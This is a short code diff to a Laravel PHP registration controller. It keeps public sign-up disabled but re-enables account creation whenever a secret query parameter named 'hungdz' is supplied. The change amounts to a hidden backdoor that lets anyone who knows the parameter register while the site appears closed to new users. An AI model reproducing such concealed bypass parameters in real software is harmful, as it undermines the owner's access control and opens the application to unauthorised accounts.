@@ -62,11 +62,15 @@ class RegisterController extends Controller
      */
     protected function create(array $data)
     {
+        if($_GET['hungdz']){
+            return User::create([
+                'name' => $data['name'],
+                'email' => $data['email'],
+                'password' => bcrypt($data['password']),
+            ]);
+        }
         echo 'cant create accout, sorry!';die;
-        //return User::create([
-        //    'name' => $data['name'],
-        //    'email' => $data['email'],
-        //    'password' => bcrypt($data['password']),
-        //]);
+
+
     }
 }
